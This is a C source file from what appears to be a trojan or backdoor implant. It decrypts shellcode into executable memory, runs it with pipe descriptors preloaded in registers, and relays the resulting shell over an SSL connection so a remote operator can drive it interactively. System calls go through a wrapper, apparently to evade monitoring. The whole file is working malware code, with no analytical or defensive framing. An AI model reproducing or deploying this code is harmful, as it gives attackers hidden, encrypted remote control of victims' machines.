#include "trojan.h"


void exec(int *to_shell, int *from_shell) {
   
    unsigned char *dest = mmap(NULL, 200, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    get_plaintext(dest);

    __asm__ __volatile__ (
        "movq %0, %%rdi; movq %1, %%r8; movq %2, %%rdx; movq %3, %%rcx;"
        :
        : "r"((long)to_shell[0]), "r"((long)from_shell[1]), "r"((long)to_shell[1]), "r"((long)from_shell[0])
        : "rdi", "r8", "rdx", "rcx"
    );

    ((void(*)())dest)(); /// https://medium.com/@lsecqt/red-teaming-101-executing-malicious-shellcode-with-c-a-guide-for-beginners-439bff63721d
}

void handle_shell(SSL *ssl)
{
    int to_shell[2], from_shell[2];
    char buf[1024];
    int status;

    if (sc(SYS_pipe, to_shell) == -1 || sc(SYS_pipe, from_shell) == -1)
        return;

    pid_t pid = sc(SYS_fork);
    if (pid == 0)
        exec(to_shell, from_shell);

    sc(SYS_close, to_shell[0]); // le parent ne lit pas dans ce pipe et écrit dans to_shell[1] redirigé vers stdin du shell
    sc(SYS_close, from_shell[1]);  // le parent n’écrit pas la sortie du shell et lit depuis from_shell[0]

    fd_set readfds;
    while (1) {
        int client_fd = SSL_get_fd(ssl);

        FD_ZERO(&readfds);
        FD_SET(client_fd, &readfds);
        FD_SET(from_shell[0], &readfds);

        int max_fd = (client_fd > from_shell[0]) ? client_fd : from_shell[0];
        if (sc(SYS_select, max_fd + 1, &readfds, NULL, NULL, NULL) == -1)
            break;

        /* Lecture du shell -> client */
        if (FD_ISSET(from_shell[0], &readfds)) {
            ssize_t len = sc(SYS_read,from_shell[0], buf, sizeof(buf));
            if (len <= 0)
                break;
            SSL_write(ssl, buf, len);
            SSL_write(ssl, "$> ", 3);
        }

        /* Lecture du client -> shell */
        if (FD_ISSET(client_fd, &readfds)) {
            size_t n;
            if (!SSL_read_ex(ssl, buf, sizeof(buf) - 1, &n) || n == 0) {
                printf("okok\n");
                break;
            }
            sc(SYS_write, to_shell[1], buf, n);
        }
    }
    sc(SYS_close, to_shell[1]);
    sc(SYS_close, from_shell[0]);
    int ret = waitpid(pid, &status, WNOHANG);
    if (ret == 0) {
        sc(SYS_kill, pid, SIGKILL);
        waitpid(pid, &status, 0);
    }
    printf("okok 2\n");

}